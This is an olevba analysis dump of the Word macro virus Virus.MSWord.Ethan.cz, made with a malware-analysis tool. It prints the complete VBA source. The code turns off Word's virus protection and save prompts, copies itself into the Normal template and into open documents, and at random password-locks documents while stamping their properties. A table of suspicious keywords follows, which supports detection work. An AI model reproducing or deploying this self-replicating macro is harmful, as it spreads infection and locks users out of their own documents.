olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.cz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.cz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    Application.EnableCancelKey = wdCancelDisabled
    With Options
        .VirusProtection = False
        .AllowFastSave = True
        .BackgroundSave = True
        .CreateBackup = False
        .SavePropertiesPrompt = False
        .SaveNormalPrompt = False
    End With
        
    Call Test_Pritomnosti
    Call Akce
    ActiveDocument.Save
    
    End Sub

Private Sub Test_Pritomnosti()
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then _
    Call Instaluj_Do_Sablony
    If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then _
    Call Instaluj_do_Dokumentu
End Sub

Private Sub Instaluj_Do_Sablony()
Call Tmp_File
Open "c:\windows\temp\wrdtmpa.tmp" For Input As #1
If LOF(1) = 0 Then GoTo konec
i = 1
Do While Not EOF(1)
Line Input #1, a
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, a
i = i + 1
Loop
konec:
Close #1
Kill "c:\windows\temp\wrdtmpa.tmp"
End Sub

Private Sub Instaluj_do_Dokumentu()
Call Tmp_File
Open "c:\windows\temp\wrdtmpa.tmp" For Input As #1
If LOF(1) = 0 Then GoTo konec
i = 1
Do While Not EOF(1)
Line Input #1, a
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, a
i = i + 1
Loop
konec:
Close #1
Kill "c:\windows\temp\wrdtmpa.tmp"
End Sub

Private Sub Tmp_File()
Open "c:\windows\temp\wrdtmpa.tmp" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\windows\temp\wrdtmpa.tmp", 6
End Sub

Private Sub Akce()
Dim Mesic, rok
Mesic = Month(Date)
rok = Year(Date)
If (Mesic = 3) Then GoTo konec   'Brezen mesic internetu - March is month of internet!
   If Rnd > 0.4 Then GoTo konec
      
    With ActiveDocument
        .Password = "DArk![FA]"
        .WritePassword = ""
    End With
    
    With Dialogs(wdDialogFileSummaryInfo): _
        .Title = "Easter  Surprise v1.1": _
        .Author = "DArk!, ISŠE": _
        .Keywords = "CZECH MADE!": _
        .Execute
    End With
    Application.DefaultSaveFormat = ""
    ActiveDocument.Save

konec:

End Sub














-------------------------------------------------------------------------------
VBA MACRO 1Table 
in file: Virus.MSWord.Ethan.cz - OLE stream: '1Table'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    Application.EnableCancelKey = wdCancelDisabled
    With Options
        .VirusProte
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

